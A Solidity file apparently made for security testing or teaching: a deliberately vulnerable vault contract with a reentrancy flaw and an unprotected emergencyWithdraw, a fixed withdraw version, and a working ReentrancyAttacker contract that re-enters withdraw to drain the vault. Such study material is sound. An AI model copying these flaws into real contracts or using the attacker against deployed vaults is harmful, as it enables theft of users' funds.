// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableVault
 * @dev A deliberately vulnerable vault contract for testing
 * 
 * VULNERABILITIES:
 * 1. Reentrancy in withdraw() - external call before state update
 * 2. Missing access control on emergencyWithdraw()
 */

contract VulnerableVault {
    mapping(address => uint256) public balances;
    address public owner;
    bool public locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed to, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier noReentrant() {
        require(!locked, "Reentrancy detected");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * VULNERABILITY #1: Reentrancy
     * The external call happens BEFORE the state update.
     * An attacker can re-enter withdraw() before balances[msg.sender] = 0
     */
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");
        
        // VULNERABLE: External call BEFORE state update!
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // State update AFTER external call - can be re-entered!
        balances[msg.sender] = 0;
        emit Withdraw(msg.sender, balance);
    }
    
    /**
     * SAFE VERSION: Uses checks-effects-interactions pattern
     */
    function withdrawSafe() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");
        
        // State update BEFORE external call
        balances[msg.sender] = 0;
        
        // External call AFTER state update
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        emit Withdraw(msg.sender, balance);
    }
    
    /**
     * VULNERABILITY #2: Missing Access Control
     * Anyone can call this and drain all funds!
     */
    function emergencyWithdraw(address to) external {
        // VULNERABLE: No onlyOwner check!
        uint256 balance = address(this).balance;
        payable(to).transfer(balance);
        emit EmergencyWithdraw(to, balance);
    }
    
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {}
}

/**
 * @title ReentrancyAttacker
 * @dev Exploits the reentrancy vulnerability in VulnerableVault
 */
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    uint256 public initialDeposit;
    
    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        initialDeposit = msg.value;
        attackCount = 0;
        
        // Step 1: Deposit
        vault.deposit{value: msg.value}();
        
        // Step 2: Trigger withdraw (will re-enter via receive())
        vault.withdraw();
    }
    
    // This is called when vault sends ETH
    receive() external payable {
        if (attackCount < 10 && address(vault).balance >= initialDeposit) {
            attackCount++;
            vault.withdraw();  // Re-enter!
        }
    }
    
    function getProfit() external view returns (uint256) {
        return address(this).balance - initialDeposit;
    }
    
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
